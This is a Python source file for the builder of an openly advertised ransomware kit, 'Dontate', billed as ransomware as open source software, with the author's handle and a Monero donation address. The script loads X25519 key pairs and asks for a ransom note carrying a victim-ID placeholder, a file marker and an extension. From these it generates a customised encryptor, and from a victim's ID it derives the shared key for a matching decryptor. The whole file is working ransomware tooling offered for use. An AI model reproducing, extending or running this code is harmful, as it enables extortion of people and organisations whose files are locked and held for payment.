import os,sys
import base64
from cryptography.hazmat.primitives.asymmetric import x25519
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
def ID2Bytes(ID):
    byte = base64.b64decode(ID.encode())
    if len(byte) != 33:
        return False
    v = byte[-1:]
    byte = byte[:-1]
    add = 0
    for b in byte:
        add += b
    if add%256 == int.from_bytes(v,'little'):
        return byte
    return False
def Save(context):
    try:
        path = input(bcolors.WARNING+'[?] Input your save path(ex:D:\\test.py):'+bcolors.ENDC)
        with open(path,'w') as f:
            f.write(context)
        print(bcolors.OKBLUE+'Done!'+bcolors.ENDC)
        return True
    except Exception as e:
        print(e)
        return False
def GenEnc(mypub,note,file_flag,endwith,note_file):
    with open('./encryptor/main.py','r') as f:
        temp = f.read()
    temp = temp.replace('{{mypub}}','mypub = '+str(mypub))
    temp = temp.replace('{{note}}','note = """'+note+'"""')
    temp = temp.replace('{{file_flag}}','file_flag = '+str(file_flag))
    temp = temp.replace('{{endwith}}','endwith = "'+endwith+'"')
    temp = temp.replace('{{note_file}}','note_file = "'+note_file+'"')
    return temp
def GenDec(shared,file_flag,endwith):
    with open('./decryptor/main.py','r') as f:
        temp = f.read()
    temp = temp.replace('{{shared}}','shared = '+str(shared))
    temp = temp.replace('{{endwith}}','endwith = "'+endwith+'"')
    temp = temp.replace('{{file_flag}}','file_flag = '+str(file_flag))
    return temp
def Enc():
    label = input(bcolors.WARNING+'[?] Input your key label:'+bcolors.ENDC)
    if label not in all_key:
        print('Not Found the key:'+label)
        return False
    key = all_key[label]
    mypub = key[0]
    notef = input(bcolors.WARNING+'[?] Input your note file path:'+bcolors.ENDC)
    try:
        with open(notef,'r') as f:
            note = f.read()
    except Exception as e:
        print(e)
        return False
    if '{{ID}}' not in note:
        print('This note is not valid!')
        return False
    flag = input(bcolors.WARNING+'[?] Input your file flag(default is abbccddeeff0):'+bcolors.ENDC)
    if flag == '':
        flag = 'abbccddeeff0'
    flag = bytes.fromhex(flag)
    endwith = input(bcolors.WARNING+'[?] Input your endwith:'+bcolors.ENDC)
    nfn = input(bcolors.WARNING+'[?] Input your note file name(default is README.txt):'+bcolors.ENDC)
    if nfn == '':
        nfn = 'README.txt'
    Save(GenEnc(mypub,note,flag,endwith,nfn))
    return True
def Dec():
    label = input(bcolors.WARNING+'[?] Input your key label:'+bcolors.ENDC)
    if label not in all_key:
        print('Not Found the key:'+label)
        return False
    key = all_key[label]
    mypri = key[1]
    ID = input(bcolors.WARNING+'[?] Input ID:'+bcolors.ENDC)
    byte = ID2Bytes(ID)
    if byte == False:
        print(bcolors.FAIL+'[!] This ID is not valid'+bcolors.ENDC)
        return False
    print(bcolors.OKBLUE+'[+] Pub key:'+str(byte)+bcolors.ENDC)
    print('Exchange...')
    private = x25519.X25519PrivateKey.from_private_bytes(mypri)
    shared = private.exchange(x25519.X25519PublicKey.from_public_bytes(byte))
    print(bcolors.OKBLUE+'[+] Shared key:'+str(shared)+bcolors.ENDC)
    flag = input(bcolors.WARNING+'[?] Input your file flag(default is abbccddeeff0):'+bcolors.ENDC)
    if flag == '':
        flag = 'abbccddeeff0'
    flag = bytearray(bytes.fromhex(flag))
    endwith = input(bcolors.WARNING+'[?] Input your endwith:'+bcolors.ENDC)
    Save(GenDec(shared,flag,endwith))
    return True
def init():
    global all_key
    all_key = {}
    for parent, dirnames, filenames in os.walk('./key'):
        for filename in filenames:
            file_path = os.path.join(parent, filename)
            extensions = os.path.splitext(file_path)[1]
            if extensions == '.key':
                if os.path.getsize(file_path) == 64:
                    key = [0,0]
                    with open(file_path,'rb') as f:
                        a = f.read()
                        key[0] = a[:32]
                        key[1] = a[32:]
                    all_key[os.path.splitext(filename)[0]] = key
def main():
    os.system('cls')
    logo = bcolors.FAIL+r''' ____              _        _
|  _ \  ___  _ __ | |_ __ _| |_ ___
| | | |/ _ \| '_ \| __/ _` | __/ _ \
| |_| | (_) | | | | || (_| | ||  __/
|____/ \___/|_| |_|\__\__,_|\__\___|
===rAnSoMwArE as an Open Source Software===
V1.3 Beta
by - SnakeH
donate(monero):497Qg6nGRAHLFxLLwpiMpoEE6QKRZWQHPSEN9DUttcLn5zdW3xn8PKUQDqS7Ui3qUpZ5YTm6QtMBKjfMXjk6BhL9GquRXnX
'''+bcolors.ENDC
    print(logo)
    print(bcolors.OKBLUE+'[*] Initializing...'+bcolors.ENDC)
    init()
    print(bcolors.WARNING+'[?] What do you want to do'+bcolors.ENDC)
    print('''
             [1] Gen a Encryptor
             [2] Gen a Decryptor
             [3] Show all of the key
             [4] Gen a new key
             ''')
    want = input('Input your choose:')
    if want == '1':
        Enc()
    elif want == '2':
        Dec()
    elif want == '3':
        print(all_key)
    elif want == '4':
        print('Run - keygen.py')
    else:
        print('I dont know what is "'+want+'"!')
    print('So,Goodbye!')
    input('Press Enter to exit...')
    exit()
main()
